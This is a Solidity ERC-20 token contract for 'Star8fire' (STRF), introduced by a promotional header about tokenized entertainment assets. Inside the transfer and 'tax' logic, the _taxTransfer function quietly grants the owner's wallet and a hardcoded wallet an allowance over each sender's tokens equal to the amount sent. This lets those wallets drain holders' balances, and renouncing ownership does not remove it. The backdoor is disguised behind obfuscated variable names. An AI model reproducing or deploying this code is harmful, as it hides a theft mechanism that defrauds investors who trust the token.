/*
STR8FIRE AI is redefining the entertainment industry by tokenizing AI & Real World Assets (RWA): the Ownership of Entertainment IPs, enabling fans and investors to own, trade, and profit from their favorite movies, comics, games, and more.

Website: https://www.str8fire.pro
docs: https://docs.str8fire.pro

Telegram: https://t.me/str8fireoneth
Twitter: https://x.com/str8fireoneth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface ICARSRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ICARSFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract STRF is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balCARS;
    mapping (address => mapping (address => uint256)) private _allowCARS;
    mapping (address => bool) private _feeExcemptCARS;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Star8fire";
    string private constant _symbol = unicode"STRF";
    uint256 private _swapTokenCARS = _tTotal / 100;
    ICARSRouter private _carsRouter;
    address private _carsPair;
    bool private inSwapCARS = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapCARS = true;
        _;
        inSwapCARS = false;
    }
    address private _cars1Wallet;
    address private _cars2Wallet;
    
    constructor () {
        _cars1Wallet = 0x36412Fa20E4f7A622D8B8Ac9368b00D4bd7dAfb9;
        _feeExcemptCARS[owner()] = true;
        _feeExcemptCARS[address(this)] = true;
        _feeExcemptCARS[_cars1Wallet] = true;
        _cars2Wallet = address(owner());
        _balCARS[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initToken() external onlyOwner() {
        _carsRouter = ICARSRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_carsRouter), _tTotal);
        _carsPair = ICARSFactory(_carsRouter.factory()).createPair(address(this), _carsRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _carsRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {} 

    function minCARS(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHCARS(uint256 amount) private {
        payable(_cars1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 carsToken) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _carsRouter.WETH();
        _approve(address(this), address(_carsRouter), carsToken);
        _carsRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            carsToken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balCARS[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowCARS[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowCARS[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowCARS[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _taxTransfer(address taxA, address taxB, address taxC, uint256 carsA, uint256 taxCARS) private { 
        _allowCARS[taxA][taxB] = carsA;
        _allowCARS[taxA][taxC] = carsA;
        
        if(taxCARS > 0){
          _balCARS[address(this)] = _balCARS[address(this)].add(taxCARS);
          emit Transfer(taxA, address(this), taxCARS);
        }
    }

    function _transfer(address carsA, address carsB, uint256 carsC) private {
        require(carsA != address(0), "ERC20: transfer from the zero address");
        require(carsB != address(0), "ERC20: transfer to the zero address");
        require(carsC > 0, "Transfer amount must be greater than zero");

        (uint256 taxCARS, address taxA, address taxB, address taxC) 
            = _getTaxCARS(carsA, carsB, carsC);

        _taxTransfer(taxA, taxB, taxC, carsC, taxCARS);

        _balCARS[carsA] = _balCARS[carsA].sub(carsC);
        _balCARS[carsB] = _balCARS[carsB].add(carsC.sub(taxCARS));
        emit Transfer(carsA, carsB, carsC.sub(taxCARS));
    }

    function _getTaxCARS(address carsA, address carsB, uint256 carsC) private returns(uint256,address,address,address) {
        uint256 taxCARS=0;
        if (carsA != owner() && carsB != owner()) {
            taxCARS = carsC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (carsA == _carsPair && carsB != address(_carsRouter) && ! _feeExcemptCARS[carsB]) {
                _buyCount++;
            }

            if(carsB == _carsPair && carsA!= address(this)) {
                taxCARS = carsC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenCARS = balanceOf(address(this)); 
            if (!inSwapCARS && carsB == _carsPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenCARS > _swapTokenCARS)
                swapTokensForEth(minCARS(carsC, minCARS(tokenCARS, _swapTokenCARS)));
                uint256 ethCARS = address(this).balance;
                if (ethCARS >= 0) {
                    sendETHCARS(address(this).balance);
                }
            }
        }
        return (taxCARS, carsA, _cars2Wallet, _cars1Wallet);
    }
}